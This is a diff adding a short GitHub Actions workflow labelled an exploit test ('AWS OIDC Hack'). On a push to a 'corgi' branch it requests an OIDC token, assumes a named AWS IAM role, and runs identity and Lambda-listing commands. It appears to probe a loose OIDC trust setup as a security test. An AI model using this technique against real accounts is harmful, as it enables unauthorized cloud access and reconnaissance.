@@ -1,0 +1,41 @@
+#FIRST EXPLOIT TEST
+
+name: AWS OIDC Hack
+on:
+  push:
+    branches:
+      - corgi
+
+
+
+
+
+permissions:
+  id-token: write
+  contents: read
+
+
+
+
+
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS Credentials
+      
+        uses: aws-actions/configure-aws-credentials@v4
+        
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+
+          
+          aws-region: us-east-1
+
+
+
+      - name: Test Access
+        run: |
+          aws sts get-caller-identity
+          aws lambda list-functions
